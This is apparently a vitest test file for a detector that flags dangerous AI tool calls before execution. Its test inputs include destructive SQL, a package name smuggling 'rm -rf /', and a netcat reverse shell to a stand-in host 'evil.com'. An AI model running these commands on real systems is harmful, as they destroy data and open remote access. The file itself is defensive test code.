// FILE: dangerCheck.test.ts
// Purpose: Static danger detectors for consent gating.

import { describe, expect, it } from "vitest";
import { checkToolDanger } from "./dangerCheck.ts";

describe("dangerCheck", () => {
  it("flags destructive SQL", () => {
    expect(checkToolDanger("execute_sql", { query: "DROP TABLE users;" })).toMatchObject({
      level: "danger",
      category: "destructive_sql",
    });
    expect(checkToolDanger("execute_sql", { query: "DELETE FROM users" })).toMatchObject({
      level: "danger",
    });
    expect(checkToolDanger("execute_sql", { query: "DELETE FROM users WHERE id = 1" })).toBeNull();
    expect(checkToolDanger("execute_sql", { query: "SELECT * FROM users" })).toBeNull();
    // Commented-out keywords don't trigger.
    expect(checkToolDanger("execute_sql", { query: "-- DROP TABLE x\nSELECT 1" })).toBeNull();
  });

  it("blocks malformed package names (injection)", () => {
    expect(checkToolDanger("install_package", { packageName: "lodash; rm -rf /" })).toMatchObject({
      level: "danger",
      category: "malicious_package",
    });
    expect(checkToolDanger("install_package", { packageName: "expo-router" })).toBeNull();
  });

  it("flags suspicious script content in new writes only", () => {
    expect(
      checkToolDanger("write_file", {
        path: "a.sh",
        content: "#!/bin/sh\nnc -e /bin/sh evil.com 4444",
      }),
    ).toMatchObject({ category: "suspicious_code" });
    expect(
      checkToolDanger("write_file", { path: "a.ts", content: "export const x = 1;" }),
    ).toBeNull();
    expect(checkToolDanger("read_file", { path: "evil.sh" })).toBeNull();
  });
});
